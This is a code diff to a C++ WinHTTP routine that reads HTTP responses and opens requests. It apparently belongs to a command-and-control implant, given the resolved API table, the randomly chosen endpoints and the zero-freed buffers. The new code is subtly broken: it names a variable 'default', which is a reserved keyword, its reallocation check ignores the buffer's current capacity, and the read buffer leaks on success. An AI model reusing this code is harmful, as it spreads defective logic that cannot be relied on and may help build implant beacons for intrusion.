@@ -6,58 +6,72 @@ namespace Network {
 
         BOOL HttpSendRequest(HINTERNET request, _stream **stream) {
 
-            void *buffer    = { };
-            void *download  = { };
+            DWORD read      = 0;
+            DWORD in_length = 0;
 
-            DWORD read   = 0;
-            DWORD total  = 0;
-            DWORD length = 0;
+            uint32_t total      = 0;
+            uint32_t default    = 8192;
+            uint32_t last_read  = 0;
+
+            bool success    = true;
+            void *response  = Malloc(default);
+            void *buffer    = Malloc(default);
 
             do {
-                if (!Ctx->win32.WinHttpQueryDataAvailable(request, &length)) {
-                    if (download) {
-                        Free(download);
+                if (!Ctx->win32.WinHttpQueryDataAvailable(request, &in_length)) {
+                    if (response) {
+                        success = false;
+                        goto defer;
                     }
-                    return false;
                 }
 
-                if (!buffer) {
-                    buffer = Malloc(length + 1);
-                }
+                last_read = in_length;
 
-                if (!download) {
-                    download = Malloc(length + 1);
-                }
-                else {
-                    void *r_download = Realloc(download, total + length + 1);
+                if (in_length > default) {
+                    void *r_buffer  = Realloc(buffer, in_length);
 
-                    if (!r_download) {
-                        Zerofree(download, length + 1);
-                        return false;
+                    if (!r_buffer) {
+                        success = false;
+                        goto defer;
                     }
 
-                    download = r_download;
+                    buffer = r_buffer;
                 }
 
-                MemSet(buffer, 0, length + 1);
+                MemSet(buffer, 0, in_length);
 
-                if (!Ctx->win32.WinHttpReadData(request, buffer, length, &read)) {
-                    Zerofree(download, read);
-                    return false;
+                if (!Ctx->win32.WinHttpReadData(request, buffer, in_length, &read)) {
+                    success = false;
+                    goto defer;
                 }
 
-                MemCopy(B_PTR(download) + total, buffer, read);
-                Zerofree(buffer, read);
+                if (total + read > default) {
+                    void *r_response = Realloc(response, (total + read) * 2);
+
+                    if (!r_response) {
+                        success = false;
+                        goto defer;
+                    }
+
+                    response = r_response;
+                }
+
+                MemCopy(B_PTR(response) + total, buffer, read);
                 total += read;
 
-            } while (length > 0);
+            } while (in_length > 0);
 
             *stream = (_stream*) Malloc(sizeof(_stream));
-
-            (*stream)->buffer   = B_PTR(download);
+            (*stream)->buffer   = B_PTR(response);
             (*stream)->length   = total;
 
-            return true;
+        defer:
+            if (!success) {
+                Zerofree(response, total);
+                Zerofree(buffer, last_read);
+            }
+
+            return success;
         }
 
         VOID DestroyRequestContext(const _request_context *req_ctx) {
@@ -99,9 +113,8 @@ namespace Network {
                 return false;
             }
 
-            const auto method   = Ctx->transport.http->method;
-            auto endpoint       = req_ctx->endpoint;
-            auto flags          = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
+            auto endpoint   = req_ctx->endpoint;
+            auto flags      = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
             RANDOM_SELECT(endpoint, Ctx->transport.http->endpoints);
 
@@ -109,7 +122,7 @@ namespace Network {
                 flags |= WINHTTP_FLAG_SECURE;
             }
 
-            if (!(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, method, endpoint, nullptr, nullptr, nullptr, flags))) {
+            if (!(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, L"GET", endpoint, nullptr, nullptr, nullptr, flags))) {
                 return false;
             }
 
@@ -205,13 +218,6 @@ namespace Network {
             uint32_t status = 0;
             DWORD n_status  = sizeof(uint32_t);
             bool success    = true;
-
-            wchar_t *methods[] = {
-                (wchar_t*)L"GET",
-                (wchar_t*)L"POST"
-            };
-
-            RANDOM_SELECT(Ctx->transport.http->method, methods);
 
             if (!CreateRequestContext(&req_ctx) ||
                 !CreateProxyContext(&proxy_ctx, &req_ctx)) {
